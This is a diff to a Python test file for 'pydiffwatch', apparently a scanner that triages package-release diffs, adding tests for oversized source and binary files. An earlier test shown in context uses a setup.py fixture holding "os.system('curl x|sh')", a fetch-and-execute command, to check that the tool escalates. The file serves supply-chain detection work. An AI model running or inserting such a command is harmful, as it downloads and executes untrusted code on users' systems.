@@ -1,4 +1,5 @@
 from pathlib import Path
+from pydiffwatch import rules as rules_mod
 from pydiffwatch.rules import load_rules
 from pydiffwatch.engine import triage
 from pydiffwatch.config import Config
@@ -169,3 +170,21 @@ def test_nan_weight_catch_all_rule_is_dropped_so_escalation_survives(tmp_path):
     rules = load_rules(tmp_path)
     assert "nan-catch-all" not in {r.id for r in rules} and len(rules) == len(RULES)
     assert triage(_code("setup.py", ["import os", "os.system('curl x|sh')"]), Config(), rules).escalate
+
+
+def test_oversized_source_weight_equals_default_threshold():
+    assert [r.weight for r in RULES if r.id == "binary-source-too-large"] == [Config().threshold_t]
+
+
+def test_one_oversized_source_alone_escalates():
+    d = Diff("p", "1.1", False, [], [{"path": "p/big.py", "size": 5_000_000, "reason": "source-too-large",
+                                       "sha256": "ab"}])
+    assert triage(d, Config(), RULES).escalate
+
+
+def test_file_too_large_scores_nothing_but_is_a_valid_binary_reason():
+    d = Diff("p", "1.1", False, [], [{"path": "d/x.bin", "size": 20_000_000, "reason": "file-too-large",
+                                       "sha256": "ab"}])
+    r = triage(d, Config(), RULES)
+    assert r.score == 0 and not r.fired_rules
+    assert "file-too-large" in rules_mod.BINARY_REASONS
